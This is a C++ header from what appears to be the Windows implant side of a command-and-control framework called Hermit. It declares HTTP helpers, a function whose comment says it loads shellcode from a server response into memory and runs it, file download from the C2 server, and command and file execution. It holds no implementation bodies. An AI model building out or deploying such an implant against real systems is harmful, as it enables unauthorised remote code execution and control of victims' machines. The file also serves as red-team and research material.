#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <tlhelp32.h>
#include "core/stdout.hpp"
#include "core/utils.hpp"

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
}

namespace System::Http
{
    VOID WinHttpCloseHandles(
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );

    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    WinHttpHandlers InitRequest(LPCWSTR lpHost, INTERNET_PORT nPort);

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpResponse SendRequest(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );

    // It's used for reading large data from responses.
    // The data is saved at 'outFile'.
    BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);

    // It's used for loading shellcode into memory and run.
    BOOL ReadResponseShellcode(HINTERNET hRequest);

    // Download a file from the C2 server
    BOOL DownloadFile(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );
}

namespace System::Process
{
    DWORD GetProcessIdByName(LPCWSTR lpProcessName);
    std::wstring ExecuteCmd(const std::wstring& cmd);
    BOOL ExecuteFile(const std::wstring& filePath);
}

#endif // HERMIT_CORE_SYSTEM_HPP